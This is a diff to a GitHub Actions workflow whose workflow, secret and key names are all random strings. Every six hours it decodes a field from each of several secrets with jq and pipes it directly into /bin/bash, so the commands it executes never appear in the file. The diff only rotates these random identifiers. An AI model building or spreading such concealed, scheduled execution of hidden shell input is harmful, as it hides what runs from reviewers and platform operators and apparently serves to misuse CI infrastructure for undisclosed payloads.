@@ -1,9 +1,11 @@
 name: gechundan5678
+
 on:
   workflow_dispatch:
   schedule:
     - cron: '9 0/6 * * *'
-jobs:  # 3892
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +13,15 @@ jobs:  # 3892
       - uses: actions/checkout@v4
       - name: gechundan5678
         env:
-          tpun945: ${{ secrets.tpun945 }}
+          dimsh8408: ${{ secrets.dimsh8408 }}
         run: |
-          echo $tpun945 | jq -r .cqzt04769 | /bin/bash
-          echo $jhrrk9592 | jq -r .fjq19434 | /bin/bash
-          echo $p4022 | jq -r .eb3746 | /bin/bash
-          echo $jd0251 | jq -r .t4107 | /bin/bash
-          echo $uiqme6198 | jq -r .nf97579 | /bin/bash
-          echo $zh8038 | jq -r .q6471 | /bin/bash
-          echo $xpmt6 | jq -r .gyd0 | /bin/bash
-          echo $pvhkc1742 | jq -r .tif8 | /bin/bash
-          echo $kou565 | jq -r .v5280 | /bin/bash
-          echo $i3778 | jq -r .l4869 | /bin/bash
-          echo $zqmn21073 | jq -r .offl9840 | /bin/bash
+          echo $dimsh8408 | jq -r .zbo110 | /bin/bash
+          echo $ym00005 | jq -r .yj3404 | /bin/bash
+          echo $jf3418 | jq -r .wt60592 | /bin/bash
+          echo $udkh33 | jq -r .sv50 | /bin/bash
+          echo $kpnn88634 | jq -r .ymgl2 | /bin/bash
+          echo $ns8 | jq -r .iqcax613 | /bin/bash
+          echo $alp0 | jq -r .w7 | /bin/bash
+          echo $bnz630 | jq -r .p84 | /bin/bash
+          echo $drml491 | jq -r .gd261 | /bin/bash
 
